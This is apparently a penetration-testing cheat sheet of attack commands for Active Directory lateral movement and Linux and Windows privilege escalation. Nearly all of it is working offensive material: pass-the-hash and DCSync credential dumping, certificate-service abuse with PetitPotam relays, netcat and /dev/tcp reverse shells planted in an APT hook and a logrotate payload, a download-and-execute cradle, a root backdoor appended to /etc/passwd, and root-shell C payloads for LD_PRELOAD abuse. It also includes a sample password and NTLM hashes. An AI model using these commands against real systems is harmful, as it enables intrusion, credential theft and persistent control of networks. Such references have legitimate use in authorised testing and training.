## Active Directory Lateral and Vertical Movement Checklist

> Source: `01101100-C0D3X-00110110.md` → `Detailed Checklists > Active Directory Lateral and Vertical Movement Checklist`

1. Find who is logged on to different hosts:

```bash
.\PsLoggedon.exe -accepteula \\COMPUTERNAME
```

2. Move laterally via RCE methods like PowerShell, WMIC, DCOM, or SC.
3. Move laterally with `psexec`.
4. Perform password spraying throughout the environment.
5. Use `Gomapexec` to attempt logins with valid credentials to different services.
6. Run Responder.
7. Run Snaffler to find sensitive files.
8. Pass the hash—reuse NTLM hashes:

```bash
nxc smb 192.168.123.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
```

9. Perform overpass-the-hash attacks.
10. Export Kerberos tickets to reuse from other systems (pass-the-ticket).
11. Attempt RCE over DCOM.
12. Mount all accessible shares and inspect them thoroughly.
13. Use Mythicsoft Agent Ransack to search for files.
14. Repeat enumeration steps—**Enumeration is key; try harder.**
15. Verify all findings and ensure no steps were missed.


## DCSync Attack

> Source: `01101100-C0D3X-00110110.md` → `Active Directory > Initial Enumeration > DCSync Attack`

```
# PowerView tool used to view the group membership of a specific user (adunn) in a target Windows domain. Performed from a Windows-based host.
Get-DomainUser -Identity adunn | sel
ect samaccountname,objectsid,memberof,useraccountcontrol |fl

# Uses Mimikatz to perform a dcsync attack from a Windows-based host.
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator

# Uses the PowerShell cmd-let Enter-PSSession to establish a PowerShell session with a target over the network (-ComputerName ACADEMY-EA-DB01) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior ($cred & $password).
Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred
```


## PS REMOTING?

> Source: `01101100-C0D3X-00110110.md` → `PS REMOTING?`

```powershell
Enter-PSSession -ComputerName <host> -Credential <dom\\user>
```


## WMI EXEC?

> Source: `01101100-C0D3X-00110110.md` → `WMI EXEC?`

```powershell
wmic /node:<host> process call create "cmd /c powershell -c <payload>"
```


## DCSync / Windows

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Windows`

As a Domain Admin
```
lsadump::dcsync /user:corp\dave
```


## DCSync / Linux

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux`

```rust
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.176.70
```


## ESC6: EDITF\_ATTRIBUTESUBJECTALTNAME2

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > ESC6: EDITF\_ATTRIBUTESUBJECTALTNAME2`

```
certipy-ad find -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -vulnerable -stdout
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template User -upn 'Administrator@<DOMAIN>'
certipy-ad req -ca '<CA>' -username 'Administrator@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template User -upn 'Administrator@<DOMAIN>'
certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
```
```
certipy-ad ca -ca '<CA>' -add-officer '<USERNAME>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>'
certipy-ad ca -ca '<CA>' -enable-template SubCA -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>'
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -template SubCA -upn 'Administrator@<DOMAIN>'
certipy-ad ca -ca '<CA>' -issue-request <ID> -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>'
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -target '<CA>' -retrieve <ID>
certipy-ad auth -pfx Administrator.pfx -dc-ip <RHOST>
```
```
certipy-ad relay -target 'http://<CA>'
certipy-ad relay -ca '<CA>' -template '<TEMPLATE>'
python3 PetitPotam.py <RHOST> <DOMAIN>
certipy-ad auth -pfx dc.pfx -dc-ip <RHOST>
export KRB5CCNAME=dc.ccache
impacket-secretsdump -k -no-pass <DOMAIN>/<RHOST>@<DOMAIN>
```


## Coercing

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > ESC6: EDITF\_ATTRIBUTESUBJECTALTNAME2 > Coercing`

```
impacket-ntlmrelayx -t http://<RHOST>/certsrv/certfnsh.asp -smb2support --adcs --template <TEMPLATE>
python3 PetitPotam.py <RHOST> <DOMAIN>
python3 gettgtpkinit.py -pfx-base64 $(cat base64.b64) '<DOMAIN>'/'<RHOST>' 'dc.ccache'
export KRB5CCNAME=dc.ccache
impacket-secretsdump -k -no-pass <DOMAIN>/<RHOST>@<DOMAIN>
```
```
certipy-ad shadow auto -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -account '<USERNAME>'
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn 'Administrator@<DOMAIN>'
certipy-ad req -ca '<CA>' -username '<USERNAME>' -hashes '<HASH>' -template '<TEMPLATE>'
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn '<USERNAME>@<DOMAIN>'
certipy-ad auth -pfx Administrator.pfx -domain '<DOMAIN>'
```

or

```
certipy-ad shadow auto -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -account '<USERNAME>'
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -user '<USERNAME>' -upn 'Administrator@<DOMAIN>'
certipy-ad req -ca '<CA>' -username '<USERNAME>' -password '<PASSWORD>' -template '<TEMPLATE>'
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn '<USERNAME>@<DOMAIN>'
certipy-ad auth -pfx Administrator.pfx -domain '<DOMAIN>'
```
```
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add computer '<USERNAME>' '<PASSWORD>'
```
```
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -user '<USERNAME>' -upn '<USERNAME>@<DOMAIN>'
```
```
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add genericAll 'OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' '<USERNAME>'
```
```
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object <USERNAME> mail -v <EMAIL>
```
```
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -template '<TEMPLATE>'
```
```
certipy-ad auth -pfx <FILE>.pfx -domain '<DOMAIN>' -username '<USERNAME>@<DOMAIN>'
```


## Case 1

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > ESC6: EDITF\_ATTRIBUTESUBJECTALTNAME2 > Case 1`

```
certipy-ad shadow auto -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -account '<USERNAME>'
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn 'Administrator@<DOMAIN>'
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -hashes '<HASH>'
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn '<USERNAME>@<DOMAIN>'
certipy-ad auth -pfx Administrator.pfx -domain '<DOMAIN>'
```


## Case 2

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > ESC6: EDITF\_ATTRIBUTESUBJECTALTNAME2 > Case 2`

```
certipy-ad shadow auto -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -account '<USERNAME>'
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn '<RHOST>@<DOMAIN>'
certipy-ad req -ca 'CA' -username '<USERNAME>@<DOMAIN>' -password -hashes '<HASH>'
certipy-ad account update -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -user '<USERNAME>' -upn '<USERNAME>@<DOMAIN>'
certipy-ad auth -pfx dc.pfx -dc-ip '<RHOST>' -ldap-shell
```


## ESC11: IF\_ENFORCEENCRYPTICERTREQUEST

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > ESC11: IF\_ENFORCEENCRYPTICERTREQUEST`

```
certipy-ad relay -target 'rpc://<CA>' -ca 'CA'
certipy-ad auth -pfx administrator.pfx -domain '<DOMAIN>'
```
```
certipy-ad forge -ca-pfx '<CA>.pfx' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-...-500' -crl 'ldap:///'
```
```
certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<RHOST>' -target '<CA>' -ca '<CA>' -template 'SecureAdminsAuthentication'
```
```
certipy-ad auth -pfx '<FILE>.pfx' -dc-ip '<RHOST>'
```
```
export KRB5CCNAME=<USERNAME>.ccache
```
```
impacket-secretsdump -just-dc-user '<RHOST>$' '<DOMAIN>/<USERNAME>@<DOMAIN>' -dc-ip '<RHOST>' -target-ip '<RHOST>' -k -no-pass
```
```
python3 entry.py find -u '<USERNAME>@<DOMAIN>' -hashes ':<HASH>' -dc-ip <RHOST> -esc14 -vulnerable -stdout -debug
```
```
Set-ADUser -Identity <USERNAME> -Add @{'altSecurityIdentities'='X509:<RFC822>foobar@domain.local'}
```
```
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object <USERNAME> mail -v foobar@domain.local
```
```
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -template '<TEMPLATE>'
```
```
certipy-ad auth -pfx <FILE>.pfx -domain '<DOMAIN>' -username '<USERNAME>'
```
```
certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'WebServer' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-...-500' -application-policies 'Client Authentication'
```
```
certipy-ad auth -pfx 'Administrator.pfx' -dc-ip '<RHOST>' -ldap-shell
```
```
certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'WebServer' -application-policies 'Certificate Request Agent'
```
```
certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'User' -pfx '<FILE>.pfx' -on-behalf-of '<DOMAIN>\Administrator'
```
```
certipy-ad auth -pfx 'Administrator.pfx' -dc-ip '<RHOST>'
```
```
certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -user '<USERNAME>' read
```
```
certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -upn 'Administrator' -user '<USERNAME>' update
```
```
certipy-ad shadow -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -account '<USERNAME>' auto
```
```
export KRB5CCNAME=<USERNAME>.ccache
```
```
certipy-ad req -k -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'User'
```

Revert the `UPN` to the original `user`.

```
certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -upn 'Administrator' -user '<USERNAME>' update
```
```
certipy-ad auth -pfx 'Administrator.pfx' -username '<USERNAME>' -domain '<DOMAIN>' -dc-ip '<RHOST>'
```
```
certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -user '<USERNAME>' read
```
```
certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -upn '<USERNAME>' -user '<USERNAME>' update
```
```
certipy-ad req -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -target '<RHOST>' -ca '<CA>' -template 'User' -upn 'Administrator@<DOMAIN>' -sid 'S-1-5-21-...-500'
```

Revert the `UPN` to the original `user`.

```
certipy-ad account -u '<USERNAME>@<DOMAIN>' -hashes '<HASH>' -dc-ip '<RHOST>' -upn '<USERNAME>' -user '<USERNAME>' update
```
```
certipy-ad auth -pfx 'Administrator.pfx' -username '<USERNAME>' -domain '<DOMAIN>' -dc-ip '<RHOST>'
```


## ADMiner

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > ADMiner`

```
AD-miner -u <USERNAME> -p <PASSWORD> -cf <NAME>
```


## Certify

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Certify`

> [https://github.com/GhostPack/Certify](https://github.com/GhostPack/Certify)

```
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser
```


## Evil-WinRM

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Evil-WinRM`

```
evil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>
evil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIVATE/KEY/<KEY>.key -p -u -S
```


## impacket-atexec

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > impacket-atexec`

```
impacket-atexec -k -no-pass <DOMAIN>/Administrator@<RHOST> 'type C:\PATH\TO\FILE\<FILE>'
```


## impacket-changepasswd

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > impacket-changepasswd`

```
impacket-changepasswd <DOMAIN>/<USERNAME>@<RHOST> -reset -altuser <USERNAME> -althash :<HASH>
```


## impacket-dcomexec

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > impacket-dcomexec`

```
impacket-dcomexec <RHOST> -object MMC20 -silentcommand -debug <DOMAIN>/<USERNAME>:<PASSWORD> <COMMAND>
impacket-dcomexec -dc-ip <RHOST> -object MMC20 -slientcommand <DOMAIN>/<USERNAME>@<RHOST> <COMMAND>
```


## impacket-findDelegation

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > impacket-findDelegation`

```
impacket-findDelegation <DOMAIN>/<USERNAME> -hashes :<HASH>
```


## impacket-GetADUsers

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > impacket-GetADUsers`

```
impacket-GetADUsers -all -dc-ip <RHOST> <DOMAIN>/
```


## impacket-getST

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > impacket-getST`

```
impacket-getST <DOMAIN>/<USERNAME> -spn <USERNAME>/<RHOST> -hashes :<HASH> -impersonate <USERNAME>
impacket-getST <DOMAIN>/<USERNAME>$ -spn <USERNAME>/<RHOST> -hashes :<HASH> -impersonate <USERNAME>
```


## impacket-getTGT

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > impacket-getTGT`

```
impacket-getTGT <DOMAIN>/<USERNAME>:<PASSWORD>
impacket-getTGT <DOMAIN>/<USERNAME> -dc-ip <DOMAIN> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
```


## impacket-lookupsid

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > impacket-lookupsid`

```
impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
```


## impacket-netview

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > impacket-netview`

```
impacket-netview <DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
```


## Common Commands

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > impacket-ntlmrelayx > Common Commands`

```
impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --interactive
impacket-ntlmrelayx -t ldap://<RHOST> -smb2support --delegate-access --no-dump --add-dns-record 'DC011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' '<LHOST>'
impacket-ntlmrelayx -t ldap://<RHOST> --no-wcf-server --escalate-user <USERNAME>
impacket-ntlmrelayx -t <LHOST> --no-http-server -smb2support -c "powershell -enc JAB<--- SNIP --->j=="
```


## Example

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > impacket-ntlmrelayx > Example`

```
impacket-ntlmrelayx --no-http-server -smb2support -t <RHOST> -c "powershell -enc JAB<--- SNIP --->j=="
```
```
dir \\<LHOST>\foobar
```
```
nc -lnvp <LPORT>
```


## impacket-psexec

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > impacket-psexec`

```
impacket-psexec <USERNAME>@<RHOST>
impacket-psexec <DOMAIN>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
```


## impacket-req

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > impacket-req`

```
impacket-reg <DOMAIN>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <COMMAND> <COMMAND>
```


## impacket-samrdump

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > impacket-samrdump`

```
impacket-samrdump <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
```


## impacket-secretsdump

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > impacket-secretsdump`

```
impacket-secretsdump <DOMAIN>/<USERNAME>@<RHOST>
impacket-secretsdump -dc-ip <RHOST> <DOMAIN>/<SUERNAME>:<PASSWORD>@<RHOST>
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
```
```
export KRB5CCNAME=<USERNAME>.ccache
impacket-secretsdump -k <DOMAIN>/<USERNAME>@<RHOST>.<DOMAIN> -no-pass -debug
```


## impacket-services

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > impacket-services`

```
impacket-services <DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <COMMAND>
```


## Requirements

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > impacket-ticketer > Requirements`

- Valid User
- NTHASH
- Domain-SID
```
export KRB5CCNAME=<USERNAME>.ccache
impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain <DOMAIN> -spn MSSQLSVC/<RHOST>.<DOMAIN> -user-id 500 Administrator
```


## Issue

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > impacket-ticketer > Issue`

```
241         if self.__doKerberos:
242             #target = self.getMachineName()
243             target = self.__kdcHost
```


## owneredit.py

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > owneredit.py`

> [https://github.com/fortra/impacket/blob/5c477e71a60e3cc434ebc0fcc374d6d108f58f41/examples/owneredit.py](https://github.com/fortra/impacket/blob/5c477e71a60e3cc434ebc0fcc374d6d108f58f41/examples/owneredit.py)

```
python3 owneredit.py -k <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <RHOST> -action write -new-owner <USERNAME> -target <GROUP> -debug
```


## ThePorgs Fork

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Impacket > ThePorgs Fork`

```
pipenv shell
git clone https://github.com/ThePorgs/impacket/
pip3 install -r requirements.txt
sudo python3 setup.py install
```


## JAWS

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > JAWS`

```
IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.ps1')
```


## Linux / Linux

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Linux`

```
id
sudo -l
env
cat ~/.bashrc
cat /etc/passwd
cat /etc/hosts
cat /etc/fstab
lsblk
ls -lah /etc/cron*
crontab -l
sudo crontab -l
crontab -u <USERNAME> -l
grep "CRON" /var/log/syslog
ss -tulpn
ps -auxf
ls -lahv
ls -R /home
ls -la /opt
dpkg -l
uname -a
```
```
openssl passwd <PASSWORD>
echo "root2:FgKl.eqJO6s2g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
```


## APT

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Linux > APT`

```
echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"};' > /etc/apt/apt.conf.d/<FILE>
```


## arua2c

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Linux > arua2c`

```
aria2c -d /root/.ssh/ -o authorized_keys "http://<LHOST>/authorized_keys" --allow-overwrite=true
```
- Bash <4.4
```
env -i SHELLOPTS=xtrace PS4='$(chmod +s /bin/bash)' /usr/local/bin/<BINARY>
```


## Bash Functions

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Linux > Bash Functions`

- Bash <4.2-048
```
function /usr/sbin/<BINARY> { /bin/bash -p; }
export -f /usr/sbin/<BINARY>
/usr/sbin/<BINARY>
```


## Capabilities

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Linux > Capabilities`

```
capsh --print
/usr/sbin/getcap -r / 2>/dev/null
```


## Credential Harvesting

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Linux > Credential Harvesting`

```
grep -R db_passwd
grep -roiE "password.{20}"
grep -oiE "password.{20}" /etc/*.conf
grep -v "^[#;]" /PATH/TO/FILE | grep -v "^$"    // grep for passwords like "DBPassword:"
watch -n 1 "ps -aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"
```


## find Commands

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Linux > find Commands`

```
find / -user <USERNAME> -ls 2>/dev/null
find / -user <USERNAME> -ls 2>/dev/null | grep -v proc 2>/dev/null
find / -group <GROUP> 2>/dev/null
find / -perm -4000 2>/dev/null | xargs ls -la
find / -type f -user root -perm -4000 2>/dev/null
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
find / -writable -type d 2>/dev/null
find / -cmin -60    // find files changed within the last 60 minutes
find / -amin -60    // find files accesses within the last 60 minutes
find ./ -type f -exec grep --color=always -i -I 'password' {} \;    // search for passwords
```


## iptables

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Linux > iptables`

```
sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n<SSH_KEY>\n'
sudo iptables -S
sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys
```


## Kernel Exploits

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Linux > Kernel Exploits`

```
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation" | grep "4." | grep -v " < 4.4.0" | grep -v "4.8"
```


## LD\_PRELOAD

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Linux > LD\_PRELOAD`

> [https://www.hackingarticles.in/linux-privilege-escalation-using-ld\_preload/](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)


## shell.c

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Linux > LD\_PRELOAD > shell.c`

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```

or

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```


## shell.c

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Linux > LD\_LIBRARY\_PATH > shell.c`

```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
    unsetenv("LD_LIBRARY_PATH");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
```


## Privilege Escalation

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Linux > LD\_LIBRARY\_PATH > Privilege Escalation`

```
sudo LD_LIBRARY_PATH=/PATH/TO/LIBRARY/<LIBRARY>.so.<NUMBER> <BINARY>
```


## logrotten

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Linux > logrotten`

> [https://github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten)

```
if [ \`id -u\` -eq 0 ]; then ( /bin/sh -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1 ); fi
```
```
./logrotten -p ./payloadfile /tmp/log/pwnme.log
```
```
./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
```
```
find / -perm -u=s -type f 2>/dev/null
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
export PATH=$(pwd):$PATH
```


## rbash

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > rbash`

```
export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
```
less /etc/profile
!/bin/sh
```
```
VISUAL="/bin/sh -c '/bin/sh'" less /etc/profile
v
```
```
less /etc/profile
v:shell
```
```
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
scp -S $TF x y:
```
```
vi -c ':!/bin/sh' /dev/null
```
```
vi
:set shell=/bin/sh
:shell
```
```
ssh <USERNAME>@<RHOST> -t sh
ssh <USERNAME>@<RHOST> -t /bin/sh
ssh <USERNAME>@<RHOST> -t "/bin/bash --no-profile"
```


## relayd

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > rbash > relayd`

The binary need to have the `SUID` bit set.

```
/usr/sbin/relayd -C /etc/shadow
```

> [https://tbhaxor.com/exploiting-shared-library-misconfigurations/](https://tbhaxor.com/exploiting-shared-library-misconfigurations/)


## shell.c

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > rbash > relayd > shell.c`

```
#include <stdlib.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}
```


## Wildcards

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > rbash > Wildcards`

> [https://www.defensecode.com/public/DefenseCode\_Unix\_WildCards\_Gone\_Wild.txt](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)

With the command `touch -- --checkpoint=1` will be a file created. Why? Because the `--` behind the command `touch` is telling touch, that there's option to be wait for. Instead of an option, it creates a file, named `--checkpoint=1`.

```
touch -- --checkpoint=1
```

or

```
touch ./--checkpoint=1
```

So after creating the `--checkpoint=1` file, i created another file, which executes a shell script.

```
touch -- '--checkpoint-action=exec=sh shell.sh'
```

or

```
touch ./--checkpoint-action=exec=<FILE>
```

To delete a misconfigured file, put a `./` in front of it.

```
rm ./'--checkpoint-action=exec=python script.sh'
```
```
/dev/shm
/tmp
```


## Microsoft Windows

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows`

```
whoami /all
whoami /user
systeminfo
net accounts
net user
net user /domain
net user <USERNAME>
Get-LocalUser
Get-LocalGroup
Get LocalGroupMember <GROUP>
Get-Process
tree /f C:\Users\
tasklist /SVC
sc query
sc qc <SERVICE>
netsh firewall show state
schtasks /query /fo LIST /v
wmic qfe get Caption,Description,HotFixID,InstalledOn
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
```


## S-R-X-Y Example

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > Access Control > S-R-X-Y Example`

| Value | Info |
| --- | --- |
| S | SID |
| R | Revision (always set to 1) |
| X | Identifier Authority (5 is the most common one) |
| Y | Sub Authority |


## SID Table

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > Access Control > SID Table`

| SID | Value |
| --- | --- |
| S-1-0-0 | Nobody |
| S-1-1-0 | Everybody |
| S-1-5-11 | Authenticated Users |
| S-1-5-18 | Local System |
| S-1-5-domainidentifier-500 | Administrator |


## accesschk

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > accesschk`

```
.\accesschk.exe /accepteula -quvw "C:\PATH\TO\FILE\<FILE>.exe"
```
```
.\accesschk.exe /accepteula -uwcqv <USERNAME> daclsvc
```
```
.\accesschk.exe /accepteula -uwdq C:\
.\accesschk.exe /accepteula -uwdq "C:\Program Files\"
.\accesschk.exe /accepteula -uwdq "C:\Program Files\<UNQUOTED_SERVICE_PATH>"
```
```
.\accesschk.exe /accepteula -uvwqk <REGISTRY_KEY>
```
```
dir /a      // show hidden folders
dir /a:d    // show all hidden directories
dir /a:h    // show all hidden files
cmd /c dir /A      // show hidden folders
cmd /c dir /A:D    // show all hidden directories
cmd /c dir /A:H    // show all hidden files
powershell ls -force    // show all hidden files
```
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```


## User Handling

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > User Handling`

```
net user <USERNAME> <PASSWORD> /add /domain
net group "Exchange Windows Permissions" /add <USERNAME>
net localgroup "Remote Management Users" /add <USERNAME>
```


## Quick Wins

> Source: `01101100-C0D3X-00110110.md` → `DCSync > Linux > Microsoft Windows > Credential Harvesting > Quick Wins`

> [https://twitter.com/NinjaParanoid/status/1516442028963659777?t=g7ed0vt6ER8nS75qd-g0sQ&s=09](https://twitter.com/NinjaParanoid/status/1516442028963659777?t=g7ed0vt6ER8nS75qd-g0sQ&s=09)

